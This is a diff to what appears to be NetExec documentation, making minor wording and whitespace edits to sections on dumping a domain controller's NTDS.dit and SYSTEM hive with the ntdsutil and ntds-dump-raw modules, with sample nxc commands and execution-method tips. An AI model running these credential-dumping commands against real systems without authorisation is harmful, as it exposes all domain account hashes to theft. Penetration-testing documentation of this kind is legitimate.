@@ -37,19 +37,20 @@ In environments with multiple domains (e.g., parent/child), make sure to specify
 
 ### Dump NTDS using ntdsutil
 
-There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py&#x20;
+There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py
 
 ```bash
 nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
 ```
+
 ### Dump NTDS using raw disk access
 
-The ntds-dump-raw module will use raw disk access to extract NTDS.dit and SYSTEM hive by reading directly from the physical drive and parse them locally with secretsdump.py&#x20;
+The ntds-dump-raw module will use raw disk access to extract NTDS.dit and SYSTEM hive by reading directly from the physical drive and parse them locally with secretsdump.py
 
 ```bash
 nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntds-dump-raw -o TARGET=NTDS
 ```
 
 {% hint style="warning" %}
-If encountering command execution errors, specify an alternative execution method such as --exec-method wmiexec or --exec-method atexec
-{% endhint %} 
+If you are encountering command execution errors, specify an alternative execution method such as --exec-method wmiexec or --exec-method atexec
+{% endhint %}
